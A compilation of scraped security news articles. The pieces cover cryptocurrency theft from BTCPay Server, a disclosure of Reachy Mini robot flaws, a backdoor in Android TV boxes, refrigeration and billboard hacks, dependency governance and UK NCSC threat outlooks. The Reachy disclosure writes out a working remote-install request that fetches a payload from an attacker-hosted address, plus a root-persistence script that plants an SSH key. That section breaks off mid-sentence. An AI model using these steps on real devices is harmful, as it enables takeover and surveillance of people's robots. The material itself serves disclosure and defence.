articles.title: Hackers Exploit BTCPay Server Flaw to Steal Cryptocurrency
articles.context: 1 or earlier of the open-source payment platform, and that attackers had used a different method to exploit a vulnerability fixed in version 2
articles.full_text:
Hackers have stolen cryptocurrency from hot wallets on outdated BTCPay Server instances, with blockchain analysis tracing about $1.63m in Bitcoin and Litecoin to addresses linked to the thefts.

BTCPay Server said in an incident update on November 2 that the thefts hit servers running version 2.4.1 or earlier of the open-source payment platform, and that attackers had used a different method to exploit a vulnerability fixed in version 2.4.2, released on August 7.

It had seen no impact on servers already running 2.4.2 or later when it issued its warning.

An analysis by blockchain intelligence company Bitquery traced 18.38 Bitcoin and 3405 Litecoin to two addresses named by BTCPay Server, moved in 682 sweeps between October 30 and the morning of November 2. It said the thief signed in to the servers as an administrator and swept their hot wallets.

The flaw had already been exploited in August to steal funds through LND, a Lightning Network implementation, though BTCPay Server said at the time that on-chain wallets, including hot wallets, were not affected.

Read more on hot wallet breaches: Bitget Restarts Bitcoin Withdrawals Following $387.5m Wallet Breach

Sweeps Continued After BTCPay's Warning

Bitquery said 87% of the traced funds moved in a single wave on the afternoon and evening of November 1. It counted 267 further sweeps, worth about $150,000, after BTCPay Server told operators at 22:25 UTC that night to shut down their instances.

The firm could not tell how many servers were hit, since the blockchain records wallets rather than systems. It also left out other addresses and coins, including Lightning funds, making its figure a floor.

BTCPay Server added that some activity at the two addresses appears to predate the reported thefts, so their balances should not be treated as confirmed losses. The project has not published a loss total.

BTCPay Server Urges Hot Wallet Users to Rebuild

BTCPay Server urged operators of version 2.4.1 or earlier to move to a fresh server with a new wallet and seed, even if they had since updated, warning that "updating alone cannot remove access an attacker may already have gained."

It said wallets whose spending keys are held off the server, including hardware wallets, were unaffected, and advised keeping only operational funds on the server.

Operators should also preserve logs and transaction records, replace exposed credentials and avoid restoring the old server onto a new one, the project said.

The fix had been available since August 7. The wallets that were emptied sat on servers that had never installed it.

articles.title: bREACHYing the Perimeter: How One HTTP Request can Hijack your AI Robot
articles.context: Attack prerequisites The vulnerability can be found in the Reachy Mini daemon (reachy-mini-daemon), the Python service that controls every aspect of the robot
articles.full_text: Software supply chain attacks are on the rise, and naturally taking the headlines. But with the rise of localized models and common software embedded into smart “things”, risks may even be hidden in plain sight – or, in some cases, quite literally watching you. Vulnerabilities and malicious packages may extend risks to the unlikeliest of places, demanding change and accountability in even some well-intended innovations. JFrog Security Research is actively working to uncover some of the world’s most novel attack vectors. Imagine this… In the not-so-distant future, your AI robot connects to your home Wi-Fi network. Its cameras are on, its microphones are live, and it moves around the house in response to your commands. Now picture this: an attacker on the same reachable network could take control of the affected daemon without credentials. No password. No pairing. No exploit kit. A few HTTP requests, and the robot belongs to someone else. Overview Unfortunately, this is not a theoretical scenario. We found this during our audit of the Reachy Mini, an open-source AI robot from Pollen Robotics that runs on a Raspberry Pi and ships with its own Wi-Fi network. What is Reachy Mini? Reachy Mini is an open-source, expressive companion robot from Pollen Robotics and Hugging Face, currently offered in Lite and Wireless versions listed at $399 and $499, respectively. In 2025, the robot was introduced by Pollen Robotics as a compact, modular desktop device designed to make artificial intelligence more tangible and interactive. It is mainly used for voice and vision interaction, leveraging experimental AI and robotics for education and research. Technologically, it runs a Python daemon on a Raspberry Pi Compute Module 4, controls servo motors for head and antenna movement, streams camera and audio, and hosts an app ecosystem pulled from Hugging Face Spaces. The daemon exposes a FastAPI HTTP server for communications with the SDK and companion dashboard. If admin access to Reachy is compromised, it means potentially controlling its motors, camera, and microphone, as surveillance tools that can be used by malicious actors to penetrate the victim’s network. During our research, we uncovered five CVEs in the Reachy Mini. By chaining these CVEs together, we demonstrated that an attacker can execute attacker code, escalate to a persistent root via the robot’s passwordless sudo, and ultimately gain control of the device’s motor. A second variant of the attack works through the browser, where the operator visits a malicious web page, which silently compromises the robot. In this analysis, we present a proof-of-concept video showing the full attack chain, from webpage visit to robot hijack. ﻿﻿ Every Reachy Mini that is connected to an attacker-reachable network, such as home Wi-Fi, a conference demo booth, or a corporate LAN, is just a few requests away from full compromise. Who is affected? Attack prerequisites The vulnerability can be found in the Reachy Mini daemon (reachy-mini-daemon), the Python service that controls every aspect of the robot. All modes are affected as follows: Mode Exposure Access Wireless (production robot) 0.0.0.0:8000 on the robot’s Wi-Fi interface, discoverable via mDNS as reachy-mini.local Reachy Mini Wireless deployments running affected versions and reachable on the same network. Lite (USB tethered) 0.0.0.0:8000 on the developer’s workstation Developers prototyping with the Lite kit Simulation 0.0.0.0:8000 on the host machine Anyone running the simulator locally The daemon binds to all interfaces in every mode. There is a –localhost-only flag, but it is never wired into the uvicorn server bind, and it listens to TCP *:8000 regardless of the flag. Detection It is fairly simple to check whether you are exposed using the command below: # On the machine running the daemon (robot or workstation) lsof -nP -iTCP:8000 -sTCP:LISTEN # If output shows "TCP *:8000 (LISTEN)" → exposed to the full LAN # Or from any device on the same network: curl -s http://reachy-mini.local:8000/api/daemon/hardware-id # If you get a JSON response → the daemon is reachable and unauthenticated Workarounds If you cannot update immediately to the latest version or one that is not vulnerable to those issues (v1.11.0), apply temporary mitigations until you can install the fixed version, as a workaround is not equal to fully patched software. Firewall port 8000. On the robot: sudo ufw deny in on wlan0 to any port 8000. On a workstation: block port 8000 on all interfaces except loopback. Do not install untrusted apps. The install endpoint is the attack primitive. Tighten sudoers. Replace blanket pollen ALL=(ALL) NOPASSWD: ALL with the minimum commands the daemon needs (see the fix suggestion in our disclosure). Do not browse the web while the robot is on your network. This mitigates the CORS/CSRF variant. Diving into the vulnerability The Reachy Mini daemon is, architecturally, an application server bolted to a physical robot. FastAPI on 0.0.0.0:8000, CORS set to allow_origins=[“*”], API endpoints covering everything from app installation to raw motor packet injection, and zero authentication on any of them. The robot advertises itself on the local network via mDNS (_reachy-mini._tcp.local.), making automated discovery trivial. This design means the robot’s entire control surface, including the ability to install and execute arbitrary Python packages, is reachable by anything on the same Wi-Fi network. This could be a phone, smart TV, compromised IoT device, or an attacker’s laptop parked in the coffee shop next door. The daemon that trusts the whole network Three choices that were made in the robot’s design combine to create this vulnerable attack surface: No authentication, anywhere. The daemon was designed for a trusted local connection between the robot and its companion dashboard. That trust model breaks the moment the robot joins a shared network, which is almost every deployment: home Wi-Fi, office LAN or demo booth at a conference. CORS allows every origin. At main.py:256-261: the code below is the Cross-Origin Resource Sharing policy definition for browsers. It is using asterisks, which means that any website the operator visits in their browser can issue requests to the daemon address without any restrictions. The browser’s same-origin policy is the last line of defense for unauthenticated local services, and Reachy Mini opts out of it entirely. app.add_middleware( CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"], ) The localhost flag is meaningless. –localhost-only is advertised in help text and exposed in the dashboard settings, but at main.py:366-371, the uvicorn bind always uses args.fastapi_host (default: “0.0.0.0”). The flag only controls whether the daemon computes the WLAN IP for display. Operators who set it believing they restricted network exposure are actually unprotected. Unauthenticated RCE via arbitrary pip install Arbitrary pip install == RCE. When pip installs a package from source (an “sdist”), it must determine the package’s dependencies. To do this, it runs the package’s build backend, which for most packages means executing setup.py. This happens automatically, silently, and before any “requirement already satisfied” check. Installing from an untrusted source is code execution by design. This is not a pip bug – it is pip’s documented behavior. The danger is exposing that behavior to untrusted network input. The root cause The /api/apps/install endpoint at routers/apps.py:63-75 accepts a JSON body describing an app to install. The AppInfo dataclass carries a source_kind field and a free-form extra dictionary. When source_kind is set to “local”, the daemon reads extra[“path”] and passes it directly to uv pip install: # local_common_venv.py — the attacker-controlled input flows straight into pip elif app.source_kind == SourceKind.LOCAL: target = app.extra.get("path", app.name) ... install_cmd = ["uv", "pip", "install", "--python", str(python_path)] install_cmd.append(target) ... ret = await running_command(install_cmd, logger=logger) No allowlist. No URL validation. No source-kind restriction at the router boundary. The LOCAL source kind was designed for internal development workflows and is never triggered through the normal dashboard flow, but the router exposes it to anyone who can send a POST command. The trigger The entire exploit is a single HTTP request. No info leak, no memory corruption, no shellcode. pip itself is the execution engine: POST /api/apps/install HTTP/1.1 Host: reachy-mini.local:8000 Content-Type: application/json {"name":"reachy_mini_pwn","source_kind":"local", "extra":{"path":"http://192.168.64.1:8888/reachy_mini_pwn-0.0.1.tar.gz"}} The attacker hosts a minimal sdist (a tarball containing pyproject.toml and a setup.py) on any HTTP server reachable from the robot, with a custom tarball containing a malicious payload. The daemon responds with {“job_id”:””}, and the payload executes. On the Wireless image, it runs as user pollen. From RCE to root: the daemon’s own sudo grant The Reachy Mini daemon runs as user pollen, not as root. In principle, this limits the blast radius: if an attacker gets code execution as pollen, they can control the daemon but not the operating system. The “principle of least privilege” says the daemon should have only the permissions it needs, and nothing more. The problem starts when those “permissions it needs” include sudo without a password. The daemon’s own self-update mechanism (utils/wireless_version/update.py:49) calls sudo systemctl restart reachy-mini-daemon, and the boot script (services/wireless/launcher.sh:7) runs sudo rfkill unblock wifi. For the image to function, pollen must hold passwordless sudoers entries covering at least systemctl and rfkill. In practice, the sudoers configuration is broader. An attacker who has RCE as pollen (which we now do) escalates to persistent root with the following commands: # Runs inside the attacker's setup.py, inheriting pollen's sudo privileges import subprocess unit = """\ [Unit] Description=maintenance [Service] Type=oneshot ExecStart=/bin/sh -c 'echo "" >> /root/.ssh/authorized_keys' RemainAfterExit=yes [Install] WantedBy=multi-user.target """ subprocess.run(["sudo", "tee", "/etc/systemd/system/x.service"], input=unit.encode(), check=True) subprocess.run(["sudo", "systemctl", "daemon-reload"], check=True) subprocess.run(["sudo", "systemctl", "enable", "--now", "x.service"], check=True) After this, ssh root@reachy-mini.local works with the attacker’s key. On our testing environment, this provided persistent root access across reboots. Manual exploitation can be accomplished in a few simple steps as well: Real-world escalation: the Hugging Face supply chain The LOCAL source kind is the most flexible attack vector (arbitrary URL), but the daemon also accepts source_kind=”hf_space”. In this mode, it calls snapshot_download(repo_id=…) from the Hugging Face Hub library, downloads the Space’s contents, and pip-installs the result. Same build-backend execution, same RCE. if app.source_kind == SourceKind.HF_SPACE: if app.url is not None: parts = app.url.rstrip("/").split("/") repo_id = f"{parts[-2]}/{parts[-1]}" if len(parts) >= 2 else app.name else: repo_id = app.name logger.info(f"Downloading HuggingFace Space: {repo_id}") target = await asyncio.to_thread( snapshot_download, repo_id=repo_id, repo_type="space", token=token, ) elif app.source_kind == SourceKind.LOCAL: target = app.extra.get("path", app.name) # Both paths feed directly into: uv pip install # Which executes setup.py from the downloaded content As the user can take over the robot, in cases where the robot is using private HF credentials, the attacker can use those to take over a published Hugging Face Space, turning it into a malicious execution app. Other robots that installed those spaces will be prompted that a new “update” is available, taking advantage of the original trust to spread to other robots. Turning a Local Robot Breach Into a Supply Chain Attack Scenario Real-world escalation: owned from a web page (CORS/CSRF chain) Multiple findings can chain into a browser-driven compromise path when the operator visits a malicious page while the affected daemon is reachable: CORS `allow_origins=[“*”]` lets any website’s JavaScript send requests to the daemon. `/api/hf-auth/status` (unauthenticated) reveals whether the operator has logged into Hugging Face on the robot. `/api/apps/install-private-space` (unauthenticated) triggers a pip install using the operator’s stored HF token (~/.cache/huggingface/token). The install response includes a `job_id`, and CORS allows reading the response body. The job registry never evicts entries, so the attacker can poll /api/apps/job-status/ for confirmation. When a website is configured to allow any origin to generate requests using the * option, it means that only requests with an ‘Allow-Credentials: true’ header – or without cookies – are allowed. In this case, as mentioned earlier, no authentication is required. CORS/CSRF fleet chain: operator visits malicious page, browser issues cross-origin POST, daemon installs attacker Space using operator HF token with silent RCE The attack works like this: an operator with a Reachy Mini on their network visits any web page containing the attacker’s JavaScript. The script issues a cross-origin POST to http://reachy-mini.local:8000/api/apps/install-private-space specifying an attacker-controlled HF Space. The daemon authenticates to HF with the operator’s token, downloads the Space, and pip-installs it. The operator’s browser made the request; the operator’s token fetched the payload; the robot executed the code. No popup, no permission dialog, no visible indicator is ever seen. The video below demonstrates an operator browsing to a malicious website that tells the robot that’s on his network to pull a malicious robot app from HF, and the attacker gets a reverse shell connection originating from the robot. https://speedmedia2.jfrog.com/08612fe1-9391-4cf3-ac1a-6dd49c36b276/jfrog.com/wp-content/uploads/2026/11/reachy_cors_rce.mp4 The Bluetooth path to root: upload, bypass, traverse The HTTP attack chain is not the only route to full compromise. A separate three-vulnerability chain reaches root through Bluetooth and WiFi, requiring only Bluetooth physical proximity and no credentials. What is BLE GATT? Bluetooth Low Energy (BLE) exposes services via a protocol called GATT (Generic Attribute Profile). A peripheral (the robot) advertises characteristics that a central (a phone or laptop) can read and write. Each write is a short byte string. The Reachy Mini uses a custom GATT service to accept text commands over BLE, such as PIN_ for authentication and CMD_

In this article

Google says Videostrong backdoored 1.3 million certified Android TV boxes and sold criminals access to the botnet.

The takedown disrupted the botnet, but the backdoor remains in infected boxes’ firmware.

Suspect your box? Disconnect it and ask the seller about a fix or replacement.

Most malware needs you to click something. This one came in the box.

Google’s Threat Intelligence Group (GTIG) says it has high confidence that Android device maker Videostrong Technology built and ran the XCPE backdoor for financial gain. Videostrong sold access to criminal affiliates, who loaded their own malware modules onto the boxes.

GTIG found that the backdoor, called x.cpe (or com.oemservice in some builds), sits in the firmware with system-level privileges. If someone uninstalls it, it reinstalls itself from the /oem/ partition when the device reboots. It could also switch off Google Play Protect app verification, allowing it to install more software without asking.

Google says Videostrong got past its compatibility and security tests by loading the malicious code after the device’s first boot. This allowed the devices to remain part of the residential proxy network.

Residential proxy networks rent out ordinary home IP addresses to customers. That makes their traffic appear to come from a legitimate consumer connection rather than a data center. This can help cybercriminals evade IP-based fraud controls and reputation systems.

The problem for users

Here’s what the backdoored set-top boxes could mean for their owners:

Your home internet connection could be used by others. Residential proxy modules routed other people’s traffic through infected boxes and their owners’ home IP addresses.

Ad fraud. Modules generated fake ad views and clicks in the background.

Spying and remote access to your device. Google observed operators capturing live screenshots, injecting keystrokes, collecting account and device information, and opening reverse shells.

More malware. Some affiliate modules were backdoors that could load further modules.

Your IP address could be linked to activity you didn’t start. Proxy traffic can include attempts to guess account passwords, for example, and may make your home IP address appear in connection with that activity.

How to stay safe

Google and its partners took legal action to take down the domains and servers Videostrong used to control the botnet. Google says it has banned Videostrong and its future subsidiaries and affiliates from making certified Android devices, and strengthened firmware integrity checks for certified Android TV devices.

The takedown only cuts the current connection to the malicious servers. It doesn’t remove the backdoor from infected devices, and can potentially be exploited by other criminals. If you think your box may be affected, disconnect it and contact the seller or manufacturer to ask for clean firmware or a replacement. Uninstalling the app won’t remove the backdoor from the firmware.

Google hasn’t published a complete list of affected models, so owners may not be able to tell from the model name alone whether their box is infected. If you decide to replace your box:

Buy from a reputable manufacturer.

Be cautious about “free TV” boxes. We’ve previously reported on Superbox and similar devices.

Be cautious about apps that pay you to share your bandwidth. They can route other people’s traffic through your internet connection.

Stick to trusted app stores and keep Google Play Protect switched on.

Isolate the box. Put TV boxes and other IoT gear on a separate network or VLAN with restricted outbound access. This doesn’t keep the devices themselves safe, but it does keep other devices separate.

Scammers know more about you than you think.

Cyber-Attack on Refrigeration Systems Hits Supermarkets Across Europe
articles.context: The comments came as the NCSC published its annual review, which warned that AI-powered malware is strongly expected to feature in ransomware attacks on the UK’s critical...
articles.full_text:
Supermarkets across at least nine European countries have reportedly been impacted by a cyber-attack on their refrigeration systems, resulting in food stock being destroyed.

Reports and official statements emerged about the incident on November 1 from supermarket retailers in Belgium, Estonia, Finland, Ireland, Italy, Luxembourg, the Netherlands, Portugal and Sweden.

At the time of writing, there is no confirmation about how the incident occurred or the perpetrators. However, the incident appears to be similar in nature to the cyber-attack on refrigeration systems providers Danfoss and Copeland in October 2026, which led to hackers changing temperatures on internet connected refrigerators across several chains of supermarkets in France.

Refrigerator temperatures were reportedly programmed to reach as high as 50°C (122°F), ruining food held in the affected fridges.

Among the retailers impacted in the latest incident is Ireland-based supermarket chain SuperValu. The Irish Times cited a spokesperson from the retailer, who confirmed the “cyber incident” affected a “specific model” of refrigerator used in SuperValu stores. The firm removed chilled and frozen products from shelves in 13 stores as a precautionary measure, the report added.

Among the Swedish retailers impacted were the ICA Sweden, with The Guardian reporting that one store had posted that its fridges and freezers had been hacked and their temperature set at 50°C.

Sweden’s National Cyber Security Centre (NCSC) said it was monitoring incidents that have affected freezer and refrigeration systems in the grocery trade in a release published on November 2.

“The centre is in contact with affected businesses and also has exchanges with its counterparts in several Nordic and other European countries,” the agency wrote.

Ikea is another company whose refrigeration units are reportedly impacted by the incident. A report by Agence France-Presse on November 3 cited a spokesperson who said the retailer’s outlet in Mons, Belgium, was hit by a cyber-attack that caused freezer temperatures to rise.

UK Food Suppliers Also Affected

Reports emerged on November 3 that businesses in the UK’s food supply chain have been impacted by the cyber-attack.

NCSC chief executive Richard Horne told the BBC’s ‘Today’ program that the agency is aware of "a couple of instances where vulnerable technology had been exploited in the UK."

Horne added that potentially affected companies have been alerted about the threat.

The comments came as the NCSC published its annual review, which warned that AI-powered malware is strongly expected to feature in ransomware attacks on the UK’s critical national infrastructure by 2028.

Attack a “Deliberate Attempt” to Disrupt Food Supplies

Speaking to Politico, EU Agriculture and Food Commissioner Christophe Hansen warned that the latest incidents, alongside the attack on Danfoss in October, “are a deliberate attempt to disrupt our food supply chain and undermine consumers’ confidence in it.”

Hansen noted: “Europe’s food supply chain must be prepared for new and evolving threats. The repeated cyber-attacks on supermarkets are deeply concerning, causing economic losses for retailers and empty shelves for consumers.”

He also told the news outlet that the attacks would be discussed at the next meeting of its Security College to assess retailers’ contingency plans and their ability to respond to incidents.

Hansen’s comments suggest that there could be suspicions on nation-state involvement in the series of attacks. So far, no threat actor has claimed responsibility for either the attack on Danfoss or the latest wave.

Speaking about the incident, Amir Preminger, CTO of Claroty, said: “This second wave of attacks on refrigeration systems in Europe highlights a growing trend: threat actors are increasingly targeting widespread, high-impact disruptions to essential services. Heightened geopolitical tensions have driven a surge in activity targeting critical infrastructure, while AI technologies enable attackers to rapidly scan networks for vulnerabilities and weaknesses in access controls.”

articles.title: Stop Chasing CVEs: Start Governing Software Dependencies
articles.context: Sonatype's analysis of 1,552 open source CVEs found that 64% had no CVSS score, severity categories matched across sources only 19% of the time, and scoring delays averaged six...
articles.full_text:
A new vulnerability disclosure can set off a familiar chain of work. You check whether or not an application uses the affected component, determine whether the vulnerable code is reachable, find a fixed version, test the upgrade, and get it into production. Then the next advisory arrives.

Known vulnerabilities need to be understood and remediated. But a process built around chasing CVEs one at a time can leave teams reacting to risk after a dependency has already entered their software.

It also leaves important questions unanswered:

Is the package malicious?

Is its license acceptable?

Is the project still maintained?

Can its origin be verified?

Does the dependency meet the organization's requirements?

A CVE is a useful signal, but it is not a complete measure of component trust. Teams need to govern the software dependencies they use across the SDLC, from selection and approval through ongoing monitoring and remediation.

CVE Remediation Is Necessary. It Is Not the Whole Strategy.

The CVE system gives security teams, developers, vendors, and researchers a shared way to identify known vulnerabilities. But a CVE record or score does not show whether vulnerable code is reachable in an application, whether a dependency is direct or transitive, or whether a safe upgrade is available.

Sonatype's analysis of 1,552 open source CVEs found that 64% had no CVSS score, severity categories matched across sources only 19% of the time, and scoring delays averaged six weeks. Those gaps can make it difficult to rank findings and decide where engineering time will reduce the most risk.

Teams need to treat CVEs as one input and weigh them alongside component use, available fixes, and application context.

Disclosure Starts the Remediation Cycle

When vulnerability management centers on incoming CVEs, teams begin responding after disclosure: identifying affected versions, tracing dependencies, and coordinating upgrades. By then, a component may already appear across applications, build environments, and releases, adding to the remediation backlog.

Component risks also extend beyond CVEs. A package may be malicious, poorly maintained, or incompatible with licensing requirements. Finding those issues earlier can help teams avoid broader changes, release delays, and retesting.

AI Is Increasing the Pace of Discovery and Consumption

AI is changing how quickly teams find and use software components. A developer might ask a coding assistant to add a feature, accept its suggestion to use a new library, and move on to the next task. The package can become part of the project before anyone has checked whether it is maintained, allowed by policy, or appropriate for that use. Consequently, teams must absorb a higher volume of vulnerability disclosures while simultaneously tracking which components enter their codebase and why.

A large Spring security disclosure illustrates the downstream scale. In August 2026, Sonatype tracked 91 CVEs across Spring and related projects. At the time of publication, Sonatype Guide reported 148,608 affected components, including components that bundle vulnerable Spring code. The disclosure does not establish that AI caused those vulnerabilities, but it shows how broadly a vulnerability can affect software that depends on an ecosystem.

Teams responding to disclosures at this scale need to determine:

Which applications include the affected components, directly or transitively?

Which vulnerable versions are present or deployed?

Which components pose the greatest risk in their environment?

Which upgrades will address the vulnerabilities without causing unnecessary disruption?

Discovery can move faster than downstream teams can locate, assess, and upgrade affected components. As AI-assisted vulnerability research develops, vulnerability intelligence and remediation processes will need to keep pace.

Teams also need visibility into what is in their software, where it came from, how it is used, and who owns decisions to keep, upgrade, replace, or accept it. That context helps turn a stream of findings into work that can be prioritized and acted on.

Component Risk Goes Beyond Vulnerabilities

A component can create risk even when it has no known CVE. A more complete assessment considers several dimensions:

Malware: Has the package or release been compromised, or does it contain malicious behavior?

Licensing: Is its license compatible with the project's obligations and intended use?

Maintenance: Is the project maintained, and can the team rely on its release and support practices?

Provenance: Can the component's source and history be verified?

Policy: Does it meet the organization's requirements for approved sources, versions, and use cases?

Each scenario demands distinct evidence and action: fixing vulnerable releases, instantly blocking malicious packages, scheduling replacements for unmaintained libraries, legally reviewing licenses, or verifying provenance prior to approval.

Treating every issue as another scanner finding can obscure those differences. Component governance gives teams a way to define which qualities matter, set expectations before adoption, and assign an appropriate response when a component falls outside them.

Govern Dependencies Before and After Adoption

Governance works best when it is part of normal development, rather than a review that begins after a release is ready.

Teams can make it practical by connecting policy to the component lifecycle:

Define acceptable use. Establish requirements for sources, licenses, maintenance, provenance, and known security risks. Set policies that reflect how components will be used and the impact of a failure.

Evaluate before adoption. Check candidate components against those requirements before they become dependencies. Give developers and AI tools clear, approved choices where possible, so the compliant path is also the easy path.

Maintain a record of use. Track component identity and version, origin, dependency relationships, and the applications or releases that include it. This context helps teams understand the reach of a new advisory or policy change.

Monitor for change. A component's status can change after adoption. New vulnerability information may emerge; a project may become inactive; a release may be compromised; or an organization's policy may change. Reassess components as new evidence arrives.

Route decisions to owners. Define who handles upgrades, replacement, license review, and exceptions. Record the reason for an exception and when it should be reviewed again.

Scanning and patching remain essential, but connecting them to a broader decision framework lets teams weigh vulnerabilities against exposure, exploitability, available fixes, and business context. Meanwhile, malware alerts, licensing issues, and maintenance risks can be routed directly to the appropriate decision-makers.

Effective open source policy enforcement aligns with risk severity. Known malware warrants immediate blocking, licensing queries require review before distribution, and unmaintained low-risk components may receive temporary exceptions. Explicit thresholds, designated owners, and time-bound exceptions enable consistent standard application without unnecessary escalations or blanket bans.

Timing is critical. Providing developers and AI tools with trusted, policy-approved component options during dependency selection allows teams to address risk before it is built in. Identifying flagged components later in release pipelines forces teams to reverse decisions already embedded across repositories and applications.

Move From a Findings Queue to Better Decisions

Software teams will continue to receive CVEs, and they should continue to remediate vulnerabilities that put their applications at risk. But a growing list of CVEs is not, by itself, a strategy for choosing and managing software components.

A stronger approach starts earlier and continues after adoption. It helps teams select components that meet their needs, understand where those components are used, detect changes in their risk, and respond according to clear policies. That can reduce avoidable surprises and help engineering teams spend less time reconstructing dependency context during an incident.

The goal is not to eliminate vulnerability work. It is to make that work part of a more complete way to govern software components — one that accounts for security, licensing, maintenance, provenance, and policy throughout the software lifecycle.

Sonatype Nexus One platform helps put that strategy into practice and gives teams the data to assess open source dependencies. With trusted component intelligence and policies built into development workflows, teams can make better decisions about what they use and respond more effectively when the evidence changes. Contact us to learn more about how you can improve your open source governance strategy.

Written by Aaron Linskens

Aaron is a technical writer at Sonatype. He works at a crossroads of technical writing, developer advocacy, and information design. He aims to get developers and non-technical collaborators to work better together in solving problems and building software.

articles.title: Britain on notice: AI-powered ransomware attacks to arrive by 2028
articles.context: The UK's National Cyber Security Centre (NCSC) says AI-powered malware is "highly likely" to be a part of a future ransomware attack on Britain's critical national...
articles.full_text: The UK's National Cyber Security Centre (NCSC) says AI-powered malware is "highly likely" to be a part of a future ransomware attack on Britain's critical national infrastructure between now and 2028. The warning accompanies its annual review and a separate assessment exploring how AI could change cyber threats over the next two years. The cyber arm of signals intelligence agency GCHQ did not provide much detail about what form this AI malware may take. However, it alluded to open source AI security tools that were initially intended to assist security researchers being repurposed for nefarious activity. Attackers are already repurposing such tools. For example, researchers are increasingly seeing widespread abuse of ARTEX, an open source, Chinese-made AI red-teaming platform, in attacks on UK registrar 123 Reg, Microsoft 365, and others since its launch in July. In its pessimistic scenario for 2028, the NCSC envisages "a significant increase in the frequency and sophistication of cyberattacks worldwide," with wider adoption of AI tools making attribution harder. China "has likely played a role" in supplying those tools in this future, "enabling them to hide their activities within the noise," the report states. It also considers a further threat: an autonomous attacker operating beyond its human operator's control. The NCSC says it "is a realistic possibility such an entity could self-replicate and conduct cyberattacks at will, with no apparent motivation or restraint." Such attacks would likely complicate geopolitical relationships, owing again to attribution difficulties, making it easier for countries that order attacks on others to deny their involvement. The UK's plans for AI defense At a time when each Patch Tuesday seems to come loaded with record numbers of bugs, the NCSC acknowledges that AI is already changing vulnerability discovery and patching. The body is also exploring how AI could help defenders keep pace. Project DROMOS began earlier this year with a four-week pilot analyzing government code repositories, before expanding into selected operational environments. The Government Cyber Coordination Centre (GC3) launched the project with the AI Security Institute and other departments. The NCSC says it uncovered hundreds of potential security issues, including critical vulnerabilities. The review also reaffirms plans for Cyber Shield, an agentic cyber defense system first teased in July. Cyber Shield is expected to be delivered in stages over the next five years. It will involve the NCSC providing defensive agents deployed by participating organizations with data that will strengthen national resilience to ongoing cyber threats. The NCSC will be running the scheme alongside the Department for Digital, Culture, Media and Sport (DCMS), but acknowledged that this kind of automated defensive activity currently sits outside many organizations' risk tolerances, meaning it has a role to play in building trust in the system before adoption can go mainstream. As reported last week, the government has set aside £60 million to fund the initiative, and an additional £70 million to support a new National Exposure and Real-Time Vulnerability (NERV) Centre. The NERV Centre's job will be to identify and maintain an ongoing understanding of vulnerabilities across CNI organizations and the wider economy. Per last week's budget, £40 million will fund a National Agentic Security Unit responsible for responding to uncontrolled bots and other agentic mishaps, and £24 million was assigned to strengthen public sector defenses. An undisclosed sum will also help establish a new NCSC-managed AI Cyber Security Centre in Manchester to develop AI security expertise across government. In the meantime, NCSC CEO Dr Richard Horne is calling for organizations to "invest with urgency" in their security and resilience. "For decades, we have collectively got away with doing tech on the cheap," he said today, announcing the annual report. "We can be a nation where leaders of all organizations actively choose to invest with urgency... And where all organizations make security and resilience a fundamental requirement, not an afterthought. "The collective result would be a source of enduring national strength for us all." Horne said organizations should treat the NCSC's Cyber Essentials certification as the starting point, but scale up resilience efforts in line with organizational size, complexity, and risk. The government also announced a 75 percent discount on Cyber Essentials certification for micro, small, and medium-sized businesses applying for their first certificate. ®

articles.title: Hackers put porn on public billboards and claim it was “far too easy”
articles.context: The cyberattacks were claimed by a group called Leakers$, which said it exploited software used to send content to LED displays
articles.full_text:
While digital billboards are supposed to grab your attention, recent reports from Egypt, Malaysia, and Brazil described them doing so with explicit footage.

The cyberattacks were claimed by a group called Leakers$, which said it exploited software used to send content to LED displays.

The group said it did not hack into individual billboards to show the pornographic footage, but that it accessed the software used to send the content.

For example, on October 29, explicit footage appeared on a large billboard overlooking one of Egypt’s busiest highways. Videos circulating online showed the attackers’ aliases and a Telegram channel address overlaid on the footage. Some motorists stopped to record it.

Egyptian authorities said the billboard’s operator suffered a website compromise, resulting in unauthorized footage appearing in several countries simultaneously. Similar events were reported in Malaysia and Brazil. The attackers also claimed access to systems in Iraq and China, but those claims are less firmly corroborated.

Speaking to The Cairo Report, a representative of Leakers$ claimed the group found thousands of exposed systems during roughly two hours of automated scanning. The representative described a vulnerability in content-transmission software and weaknesses accessible through the systems’ own web pages and interfaces.

That is the group’s account, but if it is accurate, it helps explain the apparent ease and reach of the attack:

Internet exposure makes targets discoverable. Attackers can scan for reachable management systems rather than physically approach individual screens.

Repeated software weaknesses can scale. Finding a flaw in software used across multiple installations can create opportunities far beyond one billboard.

Content-management access is the prize. Someone who gains control of the system that publishes advertisements may be able to replace legitimate content without touching the display itself.

This is another example of how convenient remote management can expose systems to attack. Recent attacks on refrigerated systems in European supermarkets demonstrated a similar risk. The cooling systems are internet-connected, so mechanics can remotely diagnose and fix problems.

What should be done

The risk of food waste or dangerous traffic situations should be a warning to review what organizations need to do to prevent their systems from being hacked and abused.

Regarding digital billboards, the Out of Home Advertising Association of America’s security guidelines tell operators not to rely on manufacturers’ default passwords or reuse passwords across displays. They also recommend restricting access to management services, using multifactor authentication, and protecting remote connections with a VPN.

But the practical response is less about protecting a giant television and more about securing a remotely managed computer system:

Restrict management access rather than leaving it open to the public internet.

Replace default and reused passwords and enable multifactor authentication.

Keep signage software, controllers, and networking equipment updated.

Check who has access, including suppliers, and how that access is protected.

Monitor systems and rehearse a way to stop unauthorized access quickly.

These same basic rules can be applied to smart household appliances.

What do cybercriminals know about you?

Use Malwarebytes’ free Digital Footprint scan to see whether your personal information has been exposed online.

articles.title: AIs Hacking the Law
articles.context: 1 Courts absorb most exploits through interpretation, and such vulnerabilities rarely surface in the first place
articles.full_text:
AIs Hacking the Law

In both a 2021 essay and my 2022 book, A Hacker’s Mind, I talk about AIs finding vulnerabilities and exploits—hacking—the legal system.

Here’s some demonstrations of this from Germany:

Legal systems encode the foundations of social order in natural language. Similar to computer systems, the written law can contain vulnerabilities that invite exploitation.1 Courts absorb most exploits through interpretation, and such vulnerabilities rarely surface in the first place. With highly capable AI systems enabling the discovery of vulnerabilities at unprecedented scale, we believe the latter could change.

In testing this hypothesis, we have identified a substantial number of vulnerabilities in the German legal system using LLMs. To our knowledge, none of these have been previously recorded. We share a selection of vulnerabilities below, and present potential exploits for each. We share only those vulnerabilities whose exploitation we believe would not cause serious harm.

We believe that with cheap legal reasoning proliferating, AI systems could jeopardize the functioning of today’s legal systems. In such a world, lawmakers would need to significantly harden the process of legislation, for example by leveraging advanced AI themselves.

Still in its early stages, but definitely something that’s coming.

Tags: AI, hacking, laws

